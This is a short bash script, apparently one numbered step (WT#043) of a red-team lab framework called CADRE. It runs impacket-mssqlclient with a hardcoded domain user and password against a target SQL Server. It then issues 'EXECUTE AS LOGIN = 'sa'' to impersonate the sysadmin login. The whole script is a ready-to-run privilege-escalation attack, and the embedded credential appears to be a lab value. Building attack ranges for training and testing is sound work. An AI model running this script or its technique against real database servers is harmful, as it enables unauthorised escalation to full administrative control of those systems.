#!/bin/bash
# CADRE — WT#043 MSSQL Impersonation
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#043 — MSSQL Impersonation"
start_attack "043" "MSSQL Impersonation"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Execute EXECUTE AS LOGIN to escalate to SA"
run_cmd "impacket-mssqlclient \"$DOMAIN_CHILD/analyst_t1:'T13r_An@lyst!'@$MBR01\" -windows-auth -query \"EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER\""

result $? "MSSQL Impersonation completed"
